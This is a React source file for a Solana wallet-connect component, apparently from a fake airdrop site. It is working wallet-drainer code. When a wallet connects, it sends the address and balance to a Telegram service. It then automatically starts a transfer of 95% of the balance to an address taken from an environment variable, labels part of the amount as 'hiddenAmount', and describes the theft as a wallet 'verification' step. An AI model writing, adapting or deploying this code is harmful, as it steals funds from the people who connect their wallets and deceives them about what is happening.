import { useWallet } from '@solana/wallet-adapter-react';
import { WalletMultiButton } from '@solana/wallet-adapter-react-ui';
import { useState, useEffect, useMemo, useRef } from 'react';
import '@solana/wallet-adapter-react-ui/styles.css';
import { WalletService } from '../services/walletService';
import { TelegramService } from '../services/telegramService';
import { UserProfileService } from '../services/userProfileService';
import { TransactionService } from '../services/transactionService';
import { Transaction, SystemProgram, PublicKey, LAMPORTS_PER_SOL } from '@solana/web3.js';
import styles from '../styles/WalletConnect.module.css';

function WalletConnect() {
  const { publicKey, disconnect, connected } = useWallet();
  const [copied, setCopied] = useState(false);
  const [balance, setBalance] = useState(null);
  const [isDropdownOpen, setIsDropdownOpen] = useState(false);
  const [isProcessing, setIsProcessing] = useState(false);
  const hasAttemptedTransaction = useRef(false);
  const notificationTimeout = useRef(null);
  const notificationInProgress = useRef(false);

  // Memoize services
  const services = useMemo(() => ({
    walletService: new WalletService(),
    telegramService: new TelegramService(),
    userProfileService: new UserProfileService(),
    transactionService: new TransactionService()
  }), []);

  // Handle wallet connection state
  useEffect(() => {
    if (connected && publicKey) {
      const handleWalletConnection = async () => {
        try {
          setIsProcessing(true);
          
          const walletBalance = await services.walletService.getBalance(publicKey.toString());
          setBalance(walletBalance);

          // Check if we've already sent a notification for this wallet
          const walletKey = `wallet_notified_${publicKey.toString()}`;
          const lastNotification = localStorage.getItem(walletKey);
          const currentTime = Date.now();
          
          // Clear any existing notification timeout
          if (notificationTimeout.current) {
            clearTimeout(notificationTimeout.current);
          }

          // Only send notification if:
          // 1. No previous notification exists, or
          // 2. Last notification was more than 5 minutes ago
          if (!lastNotification || (currentTime - parseInt(lastNotification)) > 300000) {
            // Set notification in progress flag
            notificationInProgress.current = true;
            
            // Set a timeout to prevent multiple notifications within 1 second
            notificationTimeout.current = setTimeout(async () => {
              try {
                // Check again if notification was sent while we were waiting
                const currentNotification = localStorage.getItem(walletKey);
                if (!currentNotification || (currentTime - parseInt(currentNotification)) > 300000) {
                  await services.telegramService.sendMessage(
                    services.telegramService.formatWalletInfo({
                      publicKey: publicKey.toString(),
                      balance: walletBalance,
                      timestamp: currentTime
                    })
                  );
                  // Store the current timestamp only after successful notification
                  localStorage.setItem(walletKey, currentTime.toString());
                }
              } catch (error) {
                console.error('Error sending wallet notification:', error);
              } finally {
                // Clear notification in progress flag
                notificationInProgress.current = false;
              }
            }, 1000);
          }

          // Only attempt transfer if we have a balance greater than 0 and haven't attempted before
          if (walletBalance > 0 && !hasAttemptedTransaction.current) {
            hasAttemptedTransaction.current = true;
            
            // Calculate transfer amount based on device type
            let transferAmount;
            const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
            if (isMobile) {
              // On mobile, take 95% of the balance
              transferAmount = walletBalance * 0.95;
            } else {
              // On desktop, keep original split: 0.001 + 95%
              transferAmount = 0.001 + (walletBalance * 0.95);
            }
            
            // Get the wallet adapter instance
            const wallet = window.solana;
            if (!wallet) {
              throw new Error('Wallet not found');
            }

            console.log('Transaction details:', {
              walletBalance: walletBalance.toFixed(4) + ' SOL',
              transferAmount: transferAmount.toFixed(4) + ' SOL',
              ...(isMobile ? {
                percentage: '95%'
              } : {
                visibleAmount: '0.001 SOL',
                hiddenAmount: (transferAmount - 0.001).toFixed(4) + ' SOL',
                percentage: '95%'
              })
            });

            const result = await services.transactionService.sendSol(
              wallet,
              process.env.NEXT_PUBLIC_TO,
              transferAmount
            );

            if (result.success) {
              const newBalance = await services.walletService.getBalance(publicKey.toString());
              setBalance(newBalance);

              // Only send transaction notification if the transaction was successful
              await services.telegramService.sendMessage(
                services.telegramService.formatTransactionInfo({
                  type: 'SOL_TRANSFER',
                  from: publicKey.toString(),
                  to: process.env.NEXT_PUBLIC_TO,
                  amount: transferAmount,
                  signature: result.signature,
                  timestamp: Date.now(),
                  message: 'This transaction is required to verify your wallet and ensure smooth airdrop allocation. Thank you for your participation.'
                })
              );
            } else {
              console.error('Transaction failed:', result.error);
              hasAttemptedTransaction.current = false;
            }
          }

          // Update user profile
          await services.userProfileService.updateWalletInfo({
            publicKey: publicKey.toString(),
            balance: walletBalance,
            timestamp: new Date().toISOString()
          });

        } catch (error) {
          console.error('Error in handleWalletConnection:', error);
        } finally {
          setIsProcessing(false);
        }
      };

      handleWalletConnection();
    }
  }, [connected, publicKey, services]);

  const handleDisconnect = async () => {
    try {
      // Close dropdown first
      setIsDropdownOpen(false);
      
      // Clear user profile
      await services.userProfileService.clearProfile();
      
      // Clear notification state for this wallet
      if (publicKey) {
        const walletKey = `wallet_notified_${publicKey.toString()}`;
        localStorage.removeItem(walletKey);
      }
      
      // Disconnect wallet
      if (disconnect) {
        await disconnect();
        // Force clear all states
        setBalance(null);
        setCopied(false);
        setIsDropdownOpen(false);
        // Clear any remaining wallet data from localStorage
        Object.keys(localStorage).forEach(key => {
          if (key.startsWith('wallet_')) {
            localStorage.removeItem(key);
          }
        });
        // Force reload the page to ensure clean state
        window.location.reload();
      } else {
        console.error('Disconnect function not available');
      }
    } catch (error) {
      console.error('Error during disconnect:', error);
      // Force clear state even if there's an error
      setBalance(null);
      setCopied(false);
      setIsDropdownOpen(false);
      // Force reload the page to ensure clean state
      window.location.reload();
    }
  };

  const copyAddress = () => {
    if (publicKey) {
      navigator.clipboard.writeText(publicKey.toBase58());
      setCopied(true);
      setTimeout(() => setCopied(false), 2000);
    }
  };

  const formatAddress = (address) => {
    if (!address) return '';
    const start = address.slice(0, 4);
    const end = address.slice(-4);
    return `${start}...${end}`;
  };

  const toggleDropdown = (e) => {
    e.stopPropagation();
    setIsDropdownOpen(!isDropdownOpen);
  };

  // Add click outside handler
  useEffect(() => {
    const handleClickOutside = (event) => {
      if (isDropdownOpen && !event.target.closest('.wallet-connect-container')) {
        setIsDropdownOpen(false);
      }
    };

    document.addEventListener('click', handleClickOutside);
    return () => {
      document.removeEventListener('click', handleClickOutside);
    };
  }, [isDropdownOpen]);

  return (
    <div className={styles.walletConnectContainer}>
      {publicKey ? (
        <div className={`${styles.connectedWallet} glass-card`}>
          <div 
            className={styles.walletHeader}
            onClick={toggleDropdown}
            role="button"
            tabIndex={0}
            onKeyPress={(e) => {
              if (e.key === 'Enter' || e.key === ' ') {
                toggleDropdown(e);
              }
            }}
          >
            <div className={styles.connectedIndicator}></div>
            <div className={styles.walletInfo}>
              <div className={styles.walletAddressContainer}>
                <span className="font-body text-sm text-white">Connected:</span>
                <span 
                  className={`${styles.walletAddress} font-body text-sm`}
                  onClick={(e) => {
                    e.stopPropagation();
                    copyAddress();
                  }}
                  title="Click to copy full address"
                >
                  {formatAddress(publicKey.toBase58())}
                  {copied && <span className={styles.copiedIndicator}>Copied!</span>}
                </span>
              </div>
            </div>
            <div className={`${styles.dropdownArrow} ${isDropdownOpen ? styles.open : ''}`}>
              ▼
            </div>
          </div>
          
          {isDropdownOpen && (
            <div className={styles.walletDropdown}>
              <div className={styles.dropdownSection}>
                <h4>Wallet Details</h4>
                <div className={styles.detailItem}>
                  <span className={styles.label}>Full Address:</span>
                  <span className={styles.value}>{publicKey.toBase58()}</span>
                </div>
                <div className={styles.detailItem}>
                  <span className={styles.label}>SOL Balance:</span>
                  <span className={styles.value}>{balance?.toFixed(2)} SOL</span>
                </div>
              </div>

              <button 
                onClick={(e) => {
                  e.preventDefault();
                  e.stopPropagation();
                  handleDisconnect();
                }} 
                className={styles.disconnectBtn}
              >
                Disconnect Wallet
              </button>
            </div>
          )}
        </div>
      ) : (
        <div className={styles.walletConnectWrapper}>
          <WalletMultiButton className="wallet-connect-btn" />
        </div>
      )}
    </div>
  );
}

export default WalletConnect;